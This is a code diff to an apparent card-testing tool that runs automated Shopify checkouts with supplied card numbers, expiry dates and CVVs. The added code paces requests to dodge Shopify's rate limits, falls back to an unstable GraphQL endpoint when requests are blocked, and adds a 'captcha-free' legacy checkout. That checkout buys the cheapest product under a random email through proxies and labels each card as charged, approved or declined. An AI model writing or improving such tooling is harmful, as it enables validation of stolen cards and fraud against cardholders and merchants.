@@ -64,7 +64,19 @@ extract_pci_session_id = _auto.extract_pci_session_id
 PCI_ENDPOINTS = _auto.PCI_ENDPOINTS
 extract_vault_domain = _auto.extract_vault_domain
 extract_vault_url = _auto.extract_vault_url
+extract_payment_method_id = _auto.extract_payment_method_id
 _VAULT_CACHE = _auto._VAULT_CACHE
+
+# Full GraphQL operation documents (gql_docs.json) — used as a fallback when the
+# persisted-query endpoint is throttled (429/403/5xx): post the raw query to
+# /checkouts/unstable/graphql, which survives persisted-id rotation.
+_GQL_DOCS = {}
+try:
+    _gql_path = Path(__file__).resolve().parent / "gql_docs.json"
+    if _gql_path.is_file():
+        _GQL_DOCS = json.load(open(_gql_path))
+except Exception:
+    pass
 extract_receipt_id = _auto.extract_receipt_id
 extract_poll_for_receipt_id = _auto.extract_poll_for_receipt_id
 extract_js_refs = _auto.extract_js_refs
@@ -1013,12 +1025,32 @@ async def send_pci_session(ident_sig: str, card_number: str, card_name: str,
     return last_status, last_body
 
 
-async def _post_persisted_retry(client, url, gql_payload, headers):
-    """POST a persisted GraphQL query, retrying transient 429/403/5xx.
+_SHOP_PACE: dict = {}
+_PACE_MIN_INTERVAL = 0.9
 
-    Mirrors main(6).py's _send_proposal ladder: clean -> 429/403/500 (retry)
-    -> real response. Recovers the transient soft-blocks that would otherwise
-    surface as a site error."""
+
+async def _pace(shop_url: str):
+    """Space repeat hits to the same shop so bursts don't trip Shopify's wall."""
+    now = _time.time()
+    last = _SHOP_PACE.get(shop_url, 0)
+    wait = _PACE_MIN_INTERVAL - (now - last)
+    if wait > 0:
+        await asyncio.sleep(wait)
+    _SHOP_PACE[shop_url] = _time.time()
+
+
+async def _post_persisted_retry(client, url, gql_payload, headers):
+    """POST a persisted GraphQL query, retrying transient 429/403/5xx, then
+    falling back to the full query document via /checkouts/unstable/graphql
+    (survives persisted-id rotation, mirrors main(6).py)."""
+    # op name + shop from the persisted URL: {shop}/checkouts/internal/graphql/persisted?operationName=X
+    shop_url = url.split("/checkouts/")[0]
+    op_name = ""
+    m = re.search(r"operationName=([A-Za-z0-9_]+)", url)
+    if m:
+        op_name = m.group(1)
+    doc = _GQL_DOCS.get(op_name.lower(), "") if op_name else ""
+
     last_status, last_body = 0, ""
     for attempt in range(3):
         resp = await client.post(url, data=gql_payload, headers=headers)
@@ -1027,6 +1059,18 @@ async def _post_persisted_retry(client, url, gql_payload, headers):
             await asyncio.sleep(random.uniform(0.8, 1.4) * (attempt + 1))
             continue
         return last_status, last_body
+
+    # full-query fallback
+    if doc and shop_url:
+        try:
+            variables = json.loads(gql_payload).get("variables")
+            fb = json.dumps({"operationName": op_name, "variables": variables, "query": doc})
+            resp = await client.post(
+                f"{shop_url}/checkouts/unstable/graphql?operationName={op_name}",
+                data=fb, headers=headers)
+            last_status, last_body = resp.status_code, resp.text
+        except Exception:
+            pass
     return last_status, last_body
 
 
@@ -1377,7 +1421,8 @@ async def send_submit_for_completion(client: AsyncTLSClient, shop_url: str,
                                      currency: str, country: str, signed_handles,
                                      is_digital: bool = False, tax_amount: str = None,
                                      total_any: bool = False,
-                                     payment_flexibility_terms_id: str = "") -> tuple:
+                                     payment_flexibility_terms_id: str = "",
+                                     payment_method_id: str = "", card_bin: str = "") -> tuple:
     handle_lines        = [json.dumps({"signedHandle": h}) for h in (signed_handles or [])]
     signed_handles_json = "[" + ",".join(handle_lines) + "]"
     page_id             = generate_page_id()
@@ -1386,6 +1431,13 @@ async def send_submit_for_completion(client: AsyncTLSClient, shop_url: str,
     if payment_flexibility_terms_id:
         flex_line = (',\n        "paymentFlexibilityTermsId": "'
                      + payment_flexibility_terms_id + '"')
+
+    pmid_line = ""
+    if payment_method_id:
+        pmid_line = ('"paymentMethodIdentifier": "' + payment_method_id + '",\n              ')
+    bin_line = ""
+    if card_bin:
+        bin_line = ('"creditCardBin": "' + card_bin + '",\n        ')
 
     if is_digital or total_any:
         total_amount_block = '"totalAmount": {"any": true}'
@@ -1487,7 +1539,7 @@ async def send_submit_for_completion(client: AsyncTLSClient, shop_url: str,
         "paymentLines": [{{
           "paymentMethod": {{
             "directPaymentMethod": {{
-              "sessionId": "{pci_session_id}",
+              {pmid_line}"sessionId": "{pci_session_id}",
               "billingAddress": {{
                 "streetAddress": {{
                   "address1": "{addr.address1}",
@@ -1533,7 +1585,8 @@ async def send_submit_for_completion(client: AsyncTLSClient, shop_url: str,
             "zoneCode": "{addr.zone_code}",
             "phone": "{addr.phone}"
           }}
-        }}{flex_line}
+        }},
+        {bin_line}"allowStoreCredit": false{flex_line}
       }},
       "buyerIdentity": {{
         "customer": {{"presentmentCurrency": "USD", "countryCode": "US"}},
@@ -1579,6 +1632,200 @@ async def send_submit_for_completion(client: AsyncTLSClient, shop_url: str,
         gql_payload,
         _proposal_headers(shop_url, checkout_url, checkout_token,
                           session_token, build_id, source_token))
+
+
+async def legacy_checkout_async(client: AsyncTLSClient, shop_url: str, variant_id: str,
+                                 card_number: str, card_month: int, card_year: int, card_cvv: str,
+                                 email: str, addr: Address) -> dict:
+    """Old REST/PATCH checkout fallback — no proposals, no ident sig, captcha-free path."""
+    webname = shop_url.replace("https://", "").replace("http://", "").split("/")[0]
+    try:
+        # 1. add to cart
+        r1 = await client.post(f"{shop_url}/cart/add.js",
+                               data={"id": variant_id, "quantity": 1},
+                               headers={"x-requested-with": "XMLHttpRequest",
+                                        "accept": "application/json", "referer": shop_url + "/"})
+        if r1.status_code not in (200, 201):
+            return {"status": "error", "step": "legacy_cart", "error": f"add.js {r1.status_code}"}
+        # 2. enter checkout
+        r2 = await client.get(f"{shop_url}/checkout", allow_redirects=True)
+        if "/checkouts/" not in (r2.url or ""):
+            return {"status": "error", "step": "legacy_checkout", "error": "no /checkouts/ url"}
+        checkout_url = str(r2.url)
+        # 3. authenticity token
+        r3 = await client.get(checkout_url)
+        m = re.search(r'<input type="hidden" name="authenticity_token" value="([^"]+)"', r3.text)
+        if not m:
+            return {"status": "error", "step": "legacy_token", "error": "no authenticity_token (modern-only shop)"}
+        authenticity = html.unescape(m.group(1))
+        cw = str(random.randint(1200, 1600)); ch = str(random.randint(600, 900))
+        # 4. contact + shipping
+        contact = {
+            "_method": "patch", "authenticity_token": authenticity,
+            "previous_step": "contact_information", "step": "shipping_method",
+            "checkout[email]": email, "checkout[buyer_accepts_marketing]": "0",
+            "checkout[shipping_address][first_name]": addr.first_name,
+            "checkout[shipping_address][last_name]": addr.last_name,
+            "checkout[shipping_address][address1]": addr.address1,
+            "checkout[shipping_address][address2]": addr.address2,
+            "checkout[shipping_address][city]": addr.city,
+            "checkout[shipping_address][country]": addr.country_code,
+            "checkout[shipping_address][province]": addr.zone_code,
+            "checkout[shipping_address][zip]": addr.postal_code,
+            "checkout[shipping_address][phone]": addr.phone,
+            "checkout[note]": "", "checkout[client_details][browser_width]": cw,
+            "checkout[client_details][browser_height]": ch,
+            "checkout[client_details][javascript_enabled]": "1",
+            "checkout[client_details][color_depth]": "24",
+            "checkout[client_details][java_enabled]": "false",
+            "checkout[client_details][browser_tz]": "-330",
+        }
+        r4 = await client.post(checkout_url, data=contact)
+        if r4.status_code not in (200, 302):
+            return {"status": "error", "step": "legacy_contact", "error": f"contact {r4.status_code}"}
+        if "Shipping Method" not in r4.text and "Shipping method" not in r4.text:
+            return {"status": "error", "step": "legacy_shipping", "error": "shipping step not reached"}
+        # 5. shipping rates
+        ship_tag = ""
+        try:
+            r5 = await client.get(f"{checkout_url}/shipping_rates?step=shipping_method")
+            m5 = re.search(r'<div class="radio-wrapper" data-shipping-method="([^"]+)"', r5.text)
+            if m5:
+                ship_tag = m5.group(1)
+        except Exception:
+            pass
+        if not ship_tag:
+            return {"status": "error", "step": "legacy_rates", "error": "no shipping method id"}
+        # 6. payment method step
+        ship = {
+            "_method": "patch", "authenticity_token": authenticity,
+            "previous_step": "shipping_method", "step": "payment_method",
+            "checkout[shipping_rate][id]": ship_tag,
+            "checkout[client_details][browser_width]": cw,
+            "checkout[client_details][browser_height]": ch,
+            "checkout[client_details][javascript_enabled]": "1",
+            "checkout[client_details][color_depth]": "24",
+            "checkout[client_details][java_enabled]": "false",
+            "checkout[client_details][browser_tz]": "-330",
+        }
+        r6 = await client.post(checkout_url, data=ship)
+        payment_due = re.search(r'"payment_due"\s*:\s*"([^"]+)"', r6.text)
+        payment_due = payment_due.group(1) if payment_due else ""
+        gateway = re.search(r'data-subfields-for-gateway="([^"]+)"', r6.text)
+        gateway = gateway.group(1) if gateway else "shopify_payments"
+        # 7. legacy vault tokenization
+        pci_payload = json.dumps({
+            "credit_card": {"number": card_number, "name": f"{addr.first_name} {addr.last_name}",
+                            "month": card_month, "year": card_year, "verification_value": card_cvv},
+            "payment_session_scope": webname,
+        })
+        pci_headers = {"accept": "application/json", "content-type": "application/json",
+                       "origin": "https://checkout.shopifycs.com",
+                       "referer": "https://checkout.shopifycs.com/"}
+        vault_id = ""
+        for _vault in ("https://deposit.us.shopifycs.com/sessions",
+                       "https://elb.deposit.shopifycs.com/sessions",
+                       "https://deposit.shopifycs.com/sessions",
+                       "https://checkout.pci.shopifyinc.com/sessions"):
+            try:
+                rv = await client.post(_vault, data=pci_payload, headers=pci_headers)
+                mv = re.search(r'"id"\s*:\s*"([^"]+)"', rv.text or "")
+                if mv:
+                    vault_id = mv.group(1)
+                    break
+            except Exception:
+                continue
+        if not vault_id:
+            return {"status": "error", "step": "legacy_pci", "error": "no vault session id"}
+        # 8. final PATCH
+        final_data = {
+            "_method": "patch", "authenticity_token": authenticity,
+            "previous_step": "payment_method", "step": "", "s": vault_id,
+            "checkout[payment_gateway]": gateway,
+            "checkout[credit_card][vault]": "false",
+            "checkout[different_billing_address]": "false",
+            "checkout[remember_me]": "0", "checkout[vault_phone]": "",
+            "checkout[total_price]": payment_due, "complete": "1",
+            "checkout[client_details][browser_width]": cw,
+            "checkout[client_details][browser_height]": ch,
+            "checkout[client_details][javascript_enabled]": "1",
+            "checkout[client_details][color_depth]": "24",
+            "checkout[client_details][java_enabled]": "false",
+            "checkout[client_details][browser_tz]": "-330",
+        }
+        r7 = await client.post(checkout_url, data=final_data)
+        try:
+            g = await client.get(f"{checkout_url}/processing?from_processing_page=1&validate=true",
+                                 allow_redirects=True)
+        except Exception:
+            g = None
+        final_html = (g.text if g is not None else (r7.text or ""))
+        final_url = (g.url if g is not None else "")
+        gw = gateway or "shopify_payments"
+        if "/thank" in str(final_url) or "/orders/" in str(final_url):
+            return {"status": "charged", "code": "ORDER_PAID", "gate": gw}
+        low = final_html.lower()
+        if "3d_secure" in low or "3d secure" in low:
+            return {"status": "approved", "code": "3DS_REQUIRED", "gate": gw}
+        if "insufficient fund" in low:
+            return {"status": "approved", "code": "INSUFFICIENT_FUNDS", "gate": gw}
+        if "incorrect cvv" in low or "invalid cvv" in low or "security code" in low:
+            return {"status": "declined", "code": "CVV_INVALID", "gate": gw}
+        if "expired" in low:
+            return {"status": "declined", "code": "CARD_EXPIRED", "gate": gw}
+        notice = re.search(r'<p class="notice__text">([^<]+)</p>', final_html)
+        if notice:
+            return {"status": "declined", "code": notice.group(1).strip()[:80] or "CARD_DECLINED", "gate": gw}
+        return {"status": "declined", "code": "CARD_DECLINED", "gate": gw}
+    except Exception as e:
+        return {"status": "error", "step": "legacy_exc", "error": str(e)[:120]}
+
+
+async def graphql_cart_create_async(client: AsyncTLSClient, shop_url: str,
+                                      variant_id: str, country: str) -> str:
+    """Storefront GraphQL cartCreate -> checkoutUrl (2nd cart-init path)."""
+    gid = variant_id if variant_id.startswith("gid://") else f"gid://shopify/ProductVariant/{variant_id}"
+    mutation = """
+    mutation CartCreate($input: CartInput!, $country: CountryCode!) @inContext(country: $country) {
+        cartCreate(input: $input) { cart { id checkoutUrl } userErrors { field message code } }
+    }"""
+    for ver in ("2024-01", "2025-01", "2026-01"):
+        try:
+            r = await client.post(f"{shop_url}/api/{ver}/graphql.json",
+                                  json={"query": mutation, "variables": {
+                                      "input": {"lines": [{"merchandiseId": gid, "quantity": 1}],
+                                                "buyerIdentity": {"countryCode": country}},
+                                      "country": country}},
+                                  headers={"content-type": "application/json", "accept": "application/json",
+                                           "origin": shop_url, "referer": shop_url + "/"})
+            if r.status_code != 200:
+                continue
+            cu = ((r.json().get("data", {}).get("cartCreate", {}) or {}).get("cart") or {}).get("checkoutUrl", "")
+            if cu:
+                return cu
+        except Exception:
+            continue
+    return ""
+
+
+async def legacy_checkout_entry(shop_url: str, card_entry: str, proxy_url: str = "") -> dict:
+    """Discover a product then run the legacy REST checkout (captcha-free fallback)."""
+    try:
+        card_number, card_month, card_year, card_cvv = parse_card_entry(card_entry)
+    except Exception:
+        return {"status": "error", "step": "legacy_card", "error": "bad card"}
+    email = generate_random_email()
+    client = AsyncTLSClient(timeout=15, proxy_url=proxy_url)
+    try:
+        _title, _pid, _handle, variant_id, _price = await find_cheapest_product(client, shop_url)
+    except Exception as e:
+        await client.close()
+        return {"status": "error", "step": "legacy_discovery", "error": str(e)[:100]}
+    addr = address_for_country("US")
+    res = await legacy_checkout_async(client, shop_url, variant_id, card_number,
+                                      card_month, card_year, card_cvv, email, addr)
+    await client.close()
+    return res
 
 
 # ── Main async checkout orchestrator ─────────────────────────────────
@@ -1677,6 +1924,7 @@ async def run_checkout_for_card_async(shop_url: str, card_entry: str,
 
     raw_client = AsyncTLSClient(timeout=12, proxy_url=proxy_url)
     logger = RunLogger(card_entry, shop_url, proxy_url, raw_client)
+    await _pace(shop_url)
     client = LoggedClient(raw_client, logger)
     tracker = Tracker(client, shop_url)
     try:
@@ -1695,7 +1943,7 @@ async def run_checkout_for_card_async(shop_url: str, card_entry: str,
             result.error = Exception(f"Step 0 failed: {e}")
             return result
 
-        # Step 1
+        # Step 1 — human warmup, then Storefront cartCreate fallback
         try:
             checkout_url, checkout_token, session_token, checkout_html = \
                 await human_warmup_async(client, shop_url, variant_id, product_id, product_handle, tracker)
@@ -1705,10 +1953,28 @@ async def run_checkout_for_card_async(shop_url: str, card_entry: str,
             if not stable_id or not build_id or not source_token:
                 raise Exception("missing stableId, buildId, or sourceToken")
         except Exception as e:
-            result.status = CheckStatus.ERROR
-            result.retryable = "CF_MANAGED_CHALLENGE" not in str(e)
-            result.error = Exception(f"Step 1 failed: {e}")
-            return result
+            _fell_back = False
+            cu = await graphql_cart_create_async(client, shop_url, variant_id, country)
+            if cu:
+                try:
+                    _r = await client.get(cu, allow_redirects=True)
+                    checkout_url = str(_r.url)
+                    checkout_html = _r.text
+                    _m = re.search(r'/checkouts/cn/([^/?]+)', checkout_url)
+                    checkout_token = _m.group(1) if _m else ""
+                    session_token = _extract_session_token_v2(checkout_html)
+                    stable_id    = extract_stable_id(checkout_html)
+                    build_id     = extract_commit_sha(checkout_html)
+                    source_token = extract_source_token(checkout_html)
+                    if stable_id and build_id and source_token:
+                        _fell_back = True
+                except Exception:
+                    pass
+            if not _fell_back:
+                result.status = CheckStatus.ERROR
+                result.retryable = "CF_MANAGED_CHALLENGE" not in str(e)
+                result.error = Exception(f"Step 1 failed: {e}")
+                return result
 
         # Step 2
         try:
@@ -1893,6 +2159,9 @@ async def run_checkout_for_card_async(shop_url: str, card_entry: str,
             result.amount = total_amount
 
             flex_terms_id = extract_payment_flexibility_terms_id(proposal5_body)
+            payment_method_id = (extract_payment_method_id(proposal5_body)
+                                 or extract_payment_method_id(proposal_body))
+            card_bin = card_number[:8]
             attempt_token = generate_attempt_token(checkout_token)
             current_tax   = extract_tax_amount(proposal5_body)
             current_total = total_amount
@@ -1906,7 +2175,8 @@ async def run_checkout_for_card_async(shop_url: str, card_entry: str,
                     current_total, pci_session_id, attempt_token, currency, country,
                     signed_handles, is_digital=is_digital, tax_amount=current_tax,
                     total_any=cover_any,
-                    payment_flexibility_terms_id=flex_terms_id)
+                    payment_flexibility_terms_id=flex_terms_id,
+                    payment_method_id=payment_method_id, card_bin=card_bin)
 
                 if "TAX_NEW_TAX_MUST_BE_ACCEPTED" in submit_body:
                     new_tax   = extract_tax_from_rejected(submit_body)
